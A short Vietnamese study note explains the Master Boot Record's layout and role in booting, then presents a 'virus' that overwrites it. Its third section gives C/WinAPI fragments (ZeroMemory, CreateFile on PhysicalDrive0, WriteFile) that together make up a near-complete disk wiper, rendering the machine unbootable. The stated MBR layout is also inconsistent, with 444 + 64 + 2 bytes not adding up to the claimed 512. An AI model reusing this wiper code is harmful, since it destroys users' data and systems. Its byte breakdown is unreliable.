### 1. Master Boot Record - MBR
- Là một cấu trúc dữ liệu quan trọng trên ổ đĩa cứng.
- Sector này chứa mã thực thi (executable code), chữ ký (disk signature) và bảng thông tin về các phân vùng (partition table) trên ổ đĩa cứng.
- Có kích thước là 512 bytes. Trong đó:
	+ 444 bytes đầu là Master Boot Code (executable code)
	+ 64 bytes tiếp theo là thông tin các phân vùng (partition table)
	+ 2 bytes cuối là chữ ký, giá trị là: 0x55AA

### 2. Hoạt động của MBR
- Hệ thống dựa vào cấu trúc dữ liệu này để tải các phân vùng có trên đĩa cứng.
- Nếu là phân vùng Primary và được Active thì hệ điều hành sẽ trỏ tới file BootLoader để nạp OS có trên phân vùng này.
- Đồng thời cũng tải những phân vùng Primary và Logical khác, như các phân vùng lưu dữ liệu (Không phải vùng cài OS).

### 3. Virus ghi đè MBR
- Tạo dữ liệu trắng dùng hàm ZeroMemory(), gọi là đoạn dữ liệu tạm, sẽ dùng để ghi đoạn dữ liệu tạm này vào MBR
	```
	char mbrData[MBR_SIZE];
	ZeroMemory(&mbrData, (sizeof mbrData));
	```

- Tiến hành tạo Handle Device của ổ cứng: 
	```
	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
		, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
		, NULL, OPEN_EXISTING, NULL, NULL);
	```

- Tiến hành việc ghi vào MBR:
	```
	WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL)
	```
	
- Lúc này dữ liệu gốc trên Sector này bị đã bị đè, gây lỗi khởi động hệ điều hành.

### 4. Tham khảo
- https://technet.microsoft.com/en-us/library/cc976786.aspx
- https://www.bydavy.com/2012/01/lets-decrypt-a-master-boot-record/